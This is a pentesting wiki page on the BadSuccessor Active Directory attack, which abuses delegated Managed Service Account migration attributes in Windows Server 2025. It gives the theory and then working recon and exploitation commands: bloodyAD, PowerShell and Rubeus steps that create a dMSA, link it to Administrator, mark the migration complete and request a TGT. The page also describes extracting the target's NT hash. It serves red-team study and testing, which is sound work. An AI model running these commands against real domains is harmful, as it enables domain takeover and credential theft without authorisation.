---
authors: Kasem545
category: ad
---

# BadSuccessor (dMSA abuse)

This abuse can be carried out when controlling an object that has `CreateChild` rights (for `msDS-DelegatedManagedServiceAccount` objects) over an Organizational Unit (OU), or write access to the `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` attributes of an existing delegated Managed Service Account (dMSA).

The attacker can then impersonate any Active Directory principal including Domain Admins by abusing the dMSA migration mechanism (CVE-2025-29810).

> [!WARNING] Windows Server 2025 requirement
>
> The BadSuccessor attack requires at least one Windows Server 2025 Domain Controller present in the domain. The dMSA feature was introduced in Windows Server 2025 and the KDC on older DCs will not process the relevant PAC extensions.

## Theory

Delegated Managed Service Accounts (dMSAs) are a new account type introduced in Windows Server 2025, designed to supersede existing machine or service accounts during migrations. During the migration process, two LDAP attributes control the behavior of the dMSA:

* `msDS-ManagedAccountPrecededByLink` stores the Distinguished Name of the account being superseded.
* `msDS-DelegatedMSAState` tracks the migration state (`1` = in progress, `2` = completed).

When a dMSA authenticates and the state is marked as completed (`2`), the KDC builds the Privilege Attribute Certificate (PAC) by including the SIDs of the account referenced in `msDS-ManagedAccountPrecededByLink` **without verifying that an actual migration took place**. This means a TGT issued for the dMSA carries the group memberships and privileges of the linked account.

An attacker with `CreateChild` on any OU can:
1. Create a new dMSA in that OU.
2. Point `msDS-ManagedAccountPrecededByLink` to any target account (e.g., `Administrator`).
3. Set `msDS-DelegatedMSAState` to `2`.
4. Request a TGT for the dMSA and receive a PAC populated with the target's SIDs.

[Akamai research (2025)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) found that in 91% of audited environments, at least one account outside the Domain Admins group held the required permissions to perform this attack.

## Practice

### Recon

The attack requires identifying an OU where the controlled account holds `CreateChild` rights for `msDS-DelegatedManagedServiceAccount` objects, or an existing dMSA object whose migration attributes can be written.

::: tabs

=== UNIX-like

From UNIX-like systems, [bloodyAD](https://github.com/CravateRouge/bloodyAD) can enumerate OUs where the current user can create child objects.

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --otype OU --right create --detail
```

[NetExec](https://github.com/Pennyw0rth/NetExec) includes a `badsuccessor` module to check for vulnerable permissions automatically.

```bash
nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M badsuccessor
```

=== Windows

From Windows systems, [BloodHound](../../recon/bloodhound/index) can surface `CreateChild` rights over OUs. The following Cypher query returns paths where a principal can create child objects in an OU.

```cypher
MATCH p=(n)-[:CreateChild]->(o:OU) RETURN p
```

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) can also enumerate OU ACLs manually.

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "CreateChild" -and
    $_.SecurityIdentifier -eq (
        [System.Security.Principal.NTAccount]"$DOMAIN\$USER"
    ).Translate([System.Security.Principal.SecurityIdentifier])
}
```

To check if at least one Windows Server 2025 DC is present in the domain (required for the attack to work):

```cypher
MATCH (c:Computer) WHERE c.isdc = true AND c.operatingsystem CONTAINS "2025" RETURN c.name
```

:::

### Exploitation

The exploitation chain has three stages: creating the dMSA, manipulating its migration attributes, and obtaining a TGT as the dMSA to inherit the target's privileges.

::: tabs

=== UNIX-like

From UNIX-like systems, [bloodyAD](https://github.com/CravateRouge/bloodyAD) can perform all three stages.

```bash
# Step 1 Create a dMSA in an OU where CreateChild rights are held
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
    add dMSA "$DMSA_NAME" --ou "$OU_DN"

# Step 2 Link the dMSA to the target account
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
    set object "$DMSA_NAME$" --attr msDS-ManagedAccountPrecededByLink \
    -v "$TARGET_DN"

# Step 3 Mark the migration as completed
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" \
    set object "$DMSA_NAME$" --attr msDS-DelegatedMSAState -v 2
```

Where:
* `$DMSA_NAME` an arbitrary name for the dMSA to create (e.g., `evil-dmsa`).
* `$OU_DN` Distinguished Name of the OU where `CreateChild` rights are held (e.g., `OU=ServiceAccounts,DC=domain,DC=local`).
* `$TARGET_DN` Distinguished Name of the account to impersonate (e.g., `CN=Administrator,CN=Users,DC=domain,DC=local`).

Once the attributes are set, a TGT can be requested for the dMSA using [minikerberos](https://github.com/skelsec/minikerberos) or [impacket](https://github.com/fortra/impacket). The resulting PAC will contain the target's SIDs and group memberships.

```bash
# Request a TGT for the dMSA (PAC inherits target's SIDs)
getTGT.py "$DOMAIN/$DMSA_NAME$" -dc-ip "$DC_IP" -no-pass -aesKey "$DMSA_AESKEY"
```

> [!TIP]
> The dMSA's Kerberos keys can be retrieved from the `msDS-ManagedPassword` attribute if the controlled account is listed in its `msDS-GroupMSAMembership`, or via LDAP after creation using bloodyAD.

=== Windows

From Windows systems, [SharpSuccessor](https://github.com/0xf1d0/SharpSuccessor) automates the full exploitation chain in a single command.

```powershell
# Create a dMSA, set migration attributes, and request a TGT in one step
SharpSuccessor.exe -action exploit -target "$TARGET_DN" -ou "$OU_DN"
```

Alternatively, the steps can be performed manually with the Active Directory PowerShell module and [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
# Step 1 Create the dMSA
New-ADServiceAccount -Name "$DMSA_NAME" -Path "$OU_DN" -DNSHostName "$DMSA_NAME.$DOMAIN"

# Step 2 Set migration attributes
Set-ADServiceAccount -Identity "$DMSA_NAME" -Replace @{
    'msDS-ManagedAccountPrecededByLink' = "$TARGET_DN"
    'msDS-DelegatedMSAState'            = 2
}

# Step 3 Request a TGT as the dMSA; PAC contains the target's SIDs
Rubeus.exe asktgt /user:"$DMSA_NAME$" /dmsa /dc:"$DC_IP" /ptt
```

The `/ptt` flag injects the ticket directly into the current session. Access can then be validated with standard techniques (e.g., `dir \\DC\C$`).

:::

> [!TIP] Credential extraction via KERB-DMSA-KEY-PACKAGE
>
> When the KDC issues a TGT for a dMSA, it returns a `KERB-DMSA-KEY-PACKAGE` structure containing the superseded account's RC4-HMAC (NT hash) in the `previous-keys` field. This allows the attacker to recover the target account's NT hash directly from the TGT response similar in impact to a targeted DCSync without ever touching the DC directly.

## Resources

[https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
